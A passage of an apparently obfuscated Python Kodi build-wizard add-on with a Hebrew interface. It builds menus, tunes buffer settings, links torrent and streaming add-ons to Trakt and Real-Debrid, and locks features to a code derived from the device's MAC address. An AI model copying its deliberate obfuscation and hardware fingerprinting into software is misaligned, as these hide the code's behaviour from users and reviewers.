					O0OO0O00OO0O00000 .append (O00OO0OO0O00OOO0O .strip ())#line:1718
			OO00OO00OO00O00O0 =O0OO0O00OO0O00000 #line:1719
		else :#line:1720
			O0OO0O00OO0O00000 =[]#line:1721
			for OOO0OO00000OO0OO0 in OO00OO00OO00O00O0 :#line:1722
				OOO0OO00OO000O000 =u"</"+name #line:1723
				OO0O0O0000OOO00O0 =O0000O0O00O0OO0O0 .find (OOO0OO00000OO0OO0 )#line:1725
				O000O00000000OO0O =O0000O0O00O0OO0O0 .find (OOO0OO00OO000O000 ,OO0O0O0000OOO00O0 )#line:1726
				O0OO000OO00O0O00O =O0000O0O00O0OO0O0 .find ("<"+name ,OO0O0O0000OOO00O0 +1 )#line:1727
				while O0OO000OO00O0O00O <O000O00000000OO0O and O0OO000OO00O0O00O !=-1 :#line:1729
					OO0OO00OO0O00OO0O =O0000O0O00O0OO0O0 .find (OOO0OO00OO000O000 ,O000O00000000OO0O +len (OOO0OO00OO000O000 ))#line:1730
					if OO0OO00OO0O00OO0O !=-1 :#line:1731
						O000O00000000OO0O =OO0OO00OO0O00OO0O #line:1732
					O0OO000OO00O0O00O =O0000O0O00O0OO0O0 .find ("<"+name ,O0OO000OO00O0O00O +1 )#line:1733
				if OO0O0O0000OOO00O0 ==-1 and O000O00000000OO0O ==-1 :#line:1735
					O0O0O0OO000O0O00O =u""#line:1736
				elif OO0O0O0000OOO00O0 >-1 and O000O00000000OO0O >-1 :#line:1737
					O0O0O0OO000O0O00O =O0000O0O00O0OO0O0 [OO0O0O0000OOO00O0 +len (OOO0OO00000OO0OO0 ):O000O00000000OO0O ]#line:1738
				elif O000O00000000OO0O >-1 :#line:1739
					O0O0O0OO000O0O00O =O0000O0O00O0OO0O0 [:O000O00000000OO0O ]#line:1740
				elif OO0O0O0000OOO00O0 >-1 :#line:1741
					O0O0O0OO000O0O00O =O0000O0O00O0OO0O0 [OO0O0O0000OOO00O0 +len (OOO0OO00000OO0OO0 ):]#line:1742
				if ret :#line:1744
					OOO0OO00OO000O000 =O0000O0O00O0OO0O0 [O000O00000000OO0O :O0000O0O00O0OO0O0 .find (">",O0000O0O00O0OO0O0 .find (OOO0OO00OO000O000 ))+1 ]#line:1745
					O0O0O0OO000O0O00O =OOO0OO00000OO0OO0 +O0O0O0OO000O0O00O +OOO0OO00OO000O000 #line:1746
				O0000O0O00O0OO0O0 =O0000O0O00O0OO0O0 [O0000O0O00O0OO0O0 .find (O0O0O0OO000O0O00O ,O0000O0O00O0OO0O0 .find (OOO0OO00000OO0OO0 ))+len (O0O0O0OO000O0O00O ):]#line:1748
				O0OO0O00OO0O00000 .append (O0O0O0OO000O0O00O )#line:1749
			OO00OO00OO00O00O0 =O0OO0O00OO0O00000 #line:1750
		O00OOOOOOOO0OOO00 +=OO00OO00OO00O00O0 #line:1751
	return O00OOOOOOOO0OOO00 #line:1753
def addItem (O0O00000OO0O00OO0 ,OO00O0O0OOOOOO00O ,O0000O00O0O0OOO00 ,OOO0OO000O0OOO0OO ,O0OOO0O00O00000O0 ,description =None ):#line:1755
	if description ==None :description =''#line:1756
	description ='[COLOR white]'+description +'[/COLOR]'#line:1757
	O0OO0OOOOO0O00O00 =sys .argv [0 ]+"?url="+urllib .quote_plus (OO00O0O0OOOOOO00O )+"&mode="+str (O0000O00O0O0OOO00 )+"&name="+urllib .quote_plus (O0O00000OO0O00OO0 )+"&iconimage="+urllib .quote_plus (OOO0OO000O0OOO0OO )+"&fanart="+urllib .quote_plus (O0OOO0O00O00000O0 )#line:1758
	O0OO00000O0O0O000 =True #line:1759
	O00OO0O00000OOOOO =xbmcgui .ListItem (O0O00000OO0O00OO0 ,iconImage =OOO0OO000O0OOO0OO ,thumbnailImage =OOO0OO000O0OOO0OO )#line:1760
	O00OO0O00000OOOOO .setInfo (type ="Video",infoLabels ={"Title":O0O00000OO0O00OO0 ,"Plot":description })#line:1761
	O00OO0O00000OOOOO .setProperty ("fanart_Image",O0OOO0O00O00000O0 )#line:1762
	O00OO0O00000OOOOO .setProperty ("icon_Image",OOO0OO000O0OOO0OO )#line:1763
	O0OO00000O0O0O000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO0OOOOO0O00O00 ,listitem =O00OO0O00000OOOOO ,isFolder =False )#line:1764
	return O0OO00000O0O0O000 #line:1765
def get_params ():#line:1767
		O000O0OO00OO0O00O =[]#line:1768
		O0OOO0OO0OOOOO0O0 =sys .argv [2 ]#line:1769
		if len (O0OOO0OO0OOOOO0O0 )>=2 :#line:1770
				OOO0O00OOO000000O =sys .argv [2 ]#line:1771
				O0O0OO00OOO000OOO =OOO0O00OOO000000O .replace ('?','')#line:1772
				if (OOO0O00OOO000000O [len (OOO0O00OOO000000O )-1 ]=='/'):#line:1773
						OOO0O00OOO000000O =OOO0O00OOO000000O [0 :len (OOO0O00OOO000000O )-2 ]#line:1774
				O0O0OOO0O000O0O00 =O0O0OO00OOO000OOO .split ('&')#line:1775
				O000O0OO00OO0O00O ={}#line:1776
				for OOO00O00OO000000O in range (len (O0O0OOO0O000O0O00 )):#line:1777
						O0O0OOOOO00OOOOOO ={}#line:1778
						O0O0OOOOO00OOOOOO =O0O0OOO0O000O0O00 [OOO00O00OO000000O ].split ('=')#line:1779
						if (len (O0O0OOOOO00OOOOOO ))==2 :#line:1780
								O000O0OO00OO0O00O [O0O0OOOOO00OOOOOO [0 ]]=O0O0OOOOO00OOOOOO [1 ]#line:1781
		return O000O0OO00OO0O00O #line:1783
def decode (O0O0OO0OO00O0O00O ,O0O00O0O0O0O00OOO ):#line:1788
    import base64 #line:1789
    O000OOO0OO000O0O0 =[]#line:1790
    if (len (O0O0OO0OO00O0O00O ))!=4 :#line:1792
     return 10 #line:1793
    O0O00O0O0O0O00OOO =base64 .urlsafe_b64decode (O0O00O0O0O0O00OOO )#line:1794
    for O0O00O0000O0O000O in range (len (O0O00O0O0O0O00OOO )):#line:1796
        O00OOOOOO0OO000O0 =O0O0OO0OO00O0O00O [O0O00O0000O0O000O %len (O0O0OO0OO00O0O00O )]#line:1797
        O00O0O0000OO0O0OO =chr ((256 +ord (O0O00O0O0O0O00OOO [O0O00O0000O0O000O ])-ord (O00OOOOOO0OO000O0 ))%256 )#line:1798
        O000OOO0OO000O0O0 .append (O00O0O0000OO0O0OO )#line:1799
    return "".join (O000OOO0OO000O0O0 )#line:1800
def tmdb_list (OO0OOO0OOO000OOO0 ):#line:1801
    O0OO00O0000O00000 =decode ("7643",OO0OOO0OOO000OOO0 )#line:1804
    return int (O0OO00O0000O00000 )#line:1807
def u_list (OO000O000OO0OOOO0 ):#line:1808
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1810
        from math import sqrt #line:1811
        O00O0OOOO0OOO0000 =tmdb_list (TMDB_NEW_API )#line:1812
        O00O0O0OO00OOOOOO =str ((getHwAddr ('eth0'))*O00O0OOOO0OOO0000 )#line:1814
        OOO0O0OO0O0O00OO0 =int (O00O0O0OO00OOOOOO [1 ]+O00O0O0OO00OOOOOO [2 ]+O00O0O0OO00OOOOOO [5 ]+O00O0O0OO00OOOOOO [7 ])#line:1815
        OOO0000OOOO0O00OO =(ADDON .getSetting ("pass"))#line:1817
        O0000O000O0O00O0O =(str (round (sqrt ((OOO0O0OO0O0O00OO0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1822
        if '.'in O0000O000O0O00O0O :#line:1824
         O0000O000O0O00O0O =(str (round (sqrt ((OOO0O0OO0O0O00OO0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1825
        if OOO0000OOOO0O00OO ==O0000O000O0O00O0O :#line:1827
          OO0O0OO0O000O0O0O =OO000O000OO0OOOO0 #line:1829
        else :#line:1831
           if STARTP2 ()and STARTP ()=='ok':#line:1832
             return OO000O000OO0OOOO0 #line:1835
           OO0O0OO0O000O0O0O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1836
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1837
           sys .exit ()#line:1838
        return OO0O0OO0O000O0O0O #line:1839
    else :#line:1840
        STARTP ()#line:1841
def disply_hwr ():#line:1845
   try :#line:1846
    O0O00OOO000O0O000 =tmdb_list (TMDB_NEW_API )#line:1847
    OO0OO0000OO0OO0OO =str ((getHwAddr ('eth0'))*O0O00OOO000O0O000 )#line:1848
    O0OO000000O0OOOO0 =(OO0OO0000OO0OO0OO [1 ]+OO0OO0000OO0OO0OO [2 ]+OO0OO0000OO0OO0OO [5 ]+OO0OO0000OO0OO0OO [7 ])#line:1855
    O0OOO00O0OO0OO0O0 =(ADDON .getSetting ("action"))#line:1856
    wiz .setS ('action',str (O0OO000000O0OOOO0 ))#line:1858
   except :pass #line:1859
def disply_hwr2 ():#line:1860
   try :#line:1861
    O0O0O000000000000 =tmdb_list (TMDB_NEW_API )#line:1862
    OOOOO0OOO00000OO0 =str ((getHwAddr ('eth0'))*O0O0O000000000000 )#line:1864
    O00000OOOOO00OOO0 =(OOOOO0OOO00000OO0 [1 ]+OOOOO0OOO00000OO0 [2 ]+OOOOO0OOO00000OO0 [5 ]+OOOOO0OOO00000OO0 [7 ])#line:1873
    O0OO0O0OO000000O0 =(ADDON .getSetting ("action"))#line:1874
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O00000OOOOO00OOO0 )#line:1877
   except :pass #line:1878
def getHwAddr (OOO00O0O000OOO0OO ):#line:1880
   import subprocess ,time #line:1881
   OOOO0OOOO0OO0O000 ='windows'#line:1882
   if xbmc .getCondVisibility ('system.platform.android'):#line:1883
       OOOO0OOOO0OO0O000 ='android'#line:1884
   if xbmc .getCondVisibility ('system.platform.android'):#line:1885
     OO0OO0O00O0O0OOO0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1886
     OOO00OOOO00OOO000 =re .compile ('link/ether (.+?) brd').findall (str (OO0OO0O00O0O0OOO0 ))#line:1888
     O00000OOOOOOO00OO =0 #line:1889
     for OOO0OO00O0OOOOO00 in OOO00OOOO00OOO000 :#line:1890
      if OOO00OOOO00OOO000 !='00:00:00:00:00:00':#line:1891
          O0OOO0O00OO00OOOO =OOO0OO00O0OOOOO00 #line:1892
          O00000OOOOOOO00OO =O00000OOOOOOO00OO +int (O0OOO0O00OO00OOOO .replace (':',''),16 )#line:1893
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1895
       O000O0OOOO0O0O0OO =0 #line:1896
       O00000OOOOOOO00OO =0 #line:1897
       O0O0O0O000OOO0O00 =[]#line:1898
       O0OOO000O0OOOO000 =os .popen ("getmac").read ()#line:1899
       O0OOO000O0OOOO000 =O0OOO000O0OOOO000 .split ("\n")#line:1900
       for OO000OO000OO0O0OO in O0OOO000O0OOOO000 :#line:1902
            OOOO00OO0OO0OO00O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO000OO000OO0O0OO ,re .I )#line:1903
            if OOOO00OO0OO0OO00O :#line:1904
                OOO00OOOO00OOO000 =OOOO00OO0OO0OO00O .group ().replace ('-',':')#line:1905
                O0O0O0O000OOO0O00 .append (OOO00OOOO00OOO000 )#line:1906
                O00000OOOOOOO00OO =O00000OOOOOOO00OO +int (OOO00OOOO00OOO000 .replace (':',''),16 )#line:1909
   else :#line:1911
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1912
   try :#line:1929
    return O00000OOOOOOO00OO #line:1930
   except :pass #line:1931
def getpass ():#line:1932
	disply_hwr2 ()#line:1934
def setpass ():#line:1935
    O0O0O0O0OO000OO0O =xbmcgui .Dialog ()#line:1936
    O0OO0000000OOO00O =''#line:1937
    O0OO00OOO0OOO0OOO =xbmc .Keyboard (O0OO0000000OOO00O ,'הכנס סיסמה')#line:1939
    O0OO00OOO0OOO0OOO .doModal ()#line:1940
    if O0OO00OOO0OOO0OOO .isConfirmed ():#line:1941
           O0OO00OOO0OOO0OOO =O0OO00OOO0OOO0OOO .getText ()#line:1942
    wiz .setS ('pass',str (O0OO00OOO0OOO0OOO ))#line:1943
def setuname ():#line:1944
    OO000OOO0000O0O00 =''#line:1945
    O0OOO0O0000O0OO00 =xbmc .Keyboard (OO000OOO0000O0O00 ,'הכנס שם משתמש')#line:1946
    O0OOO0O0000O0OO00 .doModal ()#line:1947
    if O0OOO0O0000O0OO00 .isConfirmed ():#line:1948
           OO000OOO0000O0O00 =O0OOO0O0000O0OO00 .getText ()#line:1949
           wiz .setS ('user',str (OO000OOO0000O0O00 ))#line:1950
def powerkodi ():#line:1951
    os ._exit (1 )#line:1952
def buffer1 ():#line:1954
	O00O0OO00OO0O0O0O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1955
	O0000O0O0O00O000O =xbmc .getInfoLabel ("System.Memory(total)")#line:1956
	O00OOOOOO000OOO00 =xbmc .getInfoLabel ("System.FreeMemory")#line:1957
	OOO000OOO000OOOO0 =re .sub ('[^0-9]','',O00OOOOOO000OOO00 )#line:1958
	OOO000OOO000OOOO0 =int (OOO000OOO000OOOO0 )/3 #line:1959
	OOO00000OOOO00OO0 =OOO000OOO000OOOO0 *1024 *1024 #line:1960
	try :OOOO000O0000000O0 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1961
	except :OOOO000O0000000O0 =16 #line:1962
	OO000O0000O000OO0 =DIALOG .yesno ('FREE MEMORY: '+str (O00OOOOOO000OOO00 ),'Based on your free Memory your optimal buffersize is: '+str (OOO000OOO000OOOO0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1965
	if OO000O0000O000OO0 ==1 :#line:1966
		with open (O00O0OO00OO0O0O0O ,"w")as O00O0OOO000O0O0OO :#line:1967
			if OOOO000O0000000O0 >=17 :O00OOO00OO0OO0000 =xml_data_advSettings_New (str (OOO00000OOOO00OO0 ))#line:1968
			else :O00OOO00OO0OO0000 =xml_data_advSettings_old (str (OOO00000OOOO00OO0 ))#line:1969
			O00O0OOO000O0O0OO .write (O00OOO00OO0OO0000 )#line:1971
			DIALOG .ok ('Buffer Size Set to: '+str (OOO00000OOOO00OO0 ),'Please restart Kodi for settings to apply.','')#line:1972
	elif OO000O0000O000OO0 ==0 :#line:1974
		OOO00000OOOO00OO0 =_OOOOO00O000OOO0OO (default =str (OOO00000OOOO00OO0 ),heading ="INPUT BUFFER SIZE")#line:1975
		with open (O00O0OO00OO0O0O0O ,"w")as O00O0OOO000O0O0OO :#line:1976
			if OOOO000O0000000O0 >=17 :O00OOO00OO0OO0000 =xml_data_advSettings_New (str (OOO00000OOOO00OO0 ))#line:1977
			else :O00OOO00OO0OO0000 =xml_data_advSettings_old (str (OOO00000OOOO00OO0 ))#line:1978
			O00O0OOO000O0O0OO .write (O00OOO00OO0OO0000 )#line:1979
			DIALOG .ok ('Buffer Size Set to: '+str (OOO00000OOOO00OO0 ),'Please restart Kodi for settings to apply.','')#line:1980
def xml_data_advSettings_old (O0OO000O00O0OO000 ):#line:1981
	OOOO00OOO000O00O0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0OO000O00O0OO000 #line:1991
	return OOOO00OOO000O00O0 #line:1992
def xml_data_advSettings_New (OO000O000000O00OO ):#line:1994
	O000OO0O0OOO0000O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO000O000000O00OO #line:2006
	return O000OO0O0OOO0000O #line:2007
def write_ADV_SETTINGS_XML (O00O0000O0OOOOOO0 ):#line:2008
    if not os .path .exists (xml_file ):#line:2009
        with open (xml_file ,"w")as OOOOOO000000OOO0O :#line:2010
            OOOOOO000000OOO0O .write (xml_data )#line:2011
def _OOOOO00O000OOO0OO (default ="",heading ="",hidden =False ):#line:2012
    ""#line:2013
    O000OO00O0O00OOO0 =xbmc .Keyboard (default ,heading ,hidden )#line:2014
    O000OO00O0O00OOO0 .doModal ()#line:2015
    if (O000OO00O0O00OOO0 .isConfirmed ()):#line:2016
        return unicode (O000OO00O0O00OOO0 .getText (),"utf-8")#line:2017
    return default #line:2018
def index ():#line:2020
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2021
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2022
	if AUTOUPDATE =='Yes':#line:2023
		if wiz .workingURL (WIZARDFILE )==True :#line:2024
			O0O0O0OOO00000O0O =wiz .checkWizard ('version')#line:2025
			if O0O0O0OOO00000O0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0O0O0OOO00000O0O ),'wizardupdate',themeit =THEME2 )#line:2026
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2027
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2028
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2029
	if len (BUILDNAME )>0 :#line:2030
		OOOOO0OOO0OOOOO0O =wiz .checkBuild (BUILDNAME ,'version')#line:2031
		O0O00O0OO00O000O0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2032
		if OOOOO0OOO0OOOOO0O >BUILDVERSION :O0O00O0OO00O000O0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O00O0OO00O000O0 ,OOOOO0OOO0OOOOO0O )#line:2033
		addDir (O0O00O0OO00O000O0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2035
		try :#line:2037
		     O0OO0OOO000O00000 =wiz .themeCount (BUILDNAME )#line:2038
		except :#line:2039
		   O0OO0OOO000O00000 =False #line:2040
		if not O0OO0OOO000O00000 ==False :#line:2041
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2042
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2043
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2046
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2047
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2048
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2052
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2054
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2056
def morsetup ():#line:2058
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2059
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2060
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2061
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2062
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2063
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2067
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2068
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2071
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2072
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2082
	setView ('files','viewType')#line:2083
def morsetup2 ():#line:2084
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2085
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2086
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2087
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2088
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
def fastupdate ():#line:2096
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2097
def forcefastupdate ():#line:2099
			OOO00OOOOO0OO00O0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2100
			wiz .ForceFastUpDate (ADDONTITLE ,OOO00OOOOO0OO00O0 )#line:2101
def rdsetup ():#line:2105
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2106
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2107
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2109
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2110
def traktsetup ():#line:2113
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2114
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2115
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2116
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	setView ('files','viewType')#line:2121
def setautorealdebrid ():#line:2122
    from resources .libs import real_debrid #line:2123
    OO00O0OOOO00OO000 =real_debrid .RealDebridFirst ()#line:2124
    OO00O0OOOO00OO000 .auth ()#line:2125
def setrealdebrid ():#line:2127
    OO0O00OO00O0O000O =(ADDON .getSetting ("auto_rd"))#line:2128
    if OO0O00OO00O0O000O =='false':#line:2129
       ADDON .openSettings ()#line:2130
    else :#line:2131
        from resources .libs import real_debrid #line:2132
        O000000O0OOO0OOO0 =real_debrid .RealDebrid ()#line:2133
        O000000O0OOO0OOO0 .auth ()#line:2134
        rdon ()#line:2137
def resolveurlsetup ():#line:2139
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2140
def urlresolversetup ():#line:2141
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2142
def placentasetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2145
def reptiliasetup ():#line:2146
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2147
def flixnetsetup ():#line:2148
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2149
def yodasetup ():#line:2150
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2151
def numberssetup ():#line:2152
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2153
def uranussetup ():#line:2154
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2155
def genesissetup ():#line:2156
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2157
def net_tools (view =None ):#line:2159
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2160
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2161
	setView ('files','viewType')#line:2163
def speedMenu ():#line:2164
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2165
def viewIP ():#line:2166
	OOO00O0OO0O000O00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2180
	O0OO0O0000OOOOO0O =[];O0OOO0000OOO0O000 =0 #line:2181
	for O0O0O0OOOO0OOOOOO in OOO00O0OO0O000O00 :#line:2182
		OO0O0OOO000O0O000 =wiz .getInfo (O0O0O0OOOO0OOOOOO )#line:2183
		OOOOOOO00O0OO00O0 =0 #line:2184
		while OO0O0OOO000O0O000 =="Busy"and OOOOOOO00O0OO00O0 <10 :#line:2185
			OO0O0OOO000O0O000 =wiz .getInfo (O0O0O0OOOO0OOOOOO );OOOOOOO00O0OO00O0 +=1 ;wiz .log ("%s sleep %s"%(O0O0O0OOOO0OOOOOO ,str (OOOOOOO00O0OO00O0 )));xbmc .sleep (1000 )#line:2186
		O0OO0O0000OOOOO0O .append (OO0O0OOO000O0O000 )#line:2187
		O0OOO0000OOO0O000 +=1 #line:2188
	OO0O00O00O0OO0OO0 ,O0000000O000000OO ,OO0OOO0O000000O0O =getIP ()#line:2189
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O0000OOOOO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2190
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00O00O0OO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2191
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000000O000000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2192
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0O000000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2193
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O0000OOOOO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2194
	setView ('files','viewType')#line:2195
def buildMenu ():#line:2197
	if USERNAME =='':#line:2198
		ADDON .openSettings ()#line:2199
		sys .exit ()#line:2200
	if PASSWORD =='':#line:2201
		ADDON .openSettings ()#line:2202
	O00O000OO00OOOOO0 =u_list (SPEEDFILE )#line:2203
	(O00O000OO00OOOOO0 )#line:2204
	OO0OOOO00O0O0OOOO =(wiz .workingURL (O00O000OO00OOOOO0 ))#line:2205
	(OO0OOOO00O0O0OOOO )#line:2206
	OO0OOOO00O0O0OOOO =wiz .workingURL (SPEEDFILE )#line:2207
	if not OO0OOOO00O0O0OOOO ==True :#line:2208
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2209
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2210
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2211
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2212
		addFile ('%s'%OO0OOOO00O0O0OOOO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2213
	else :#line:2214
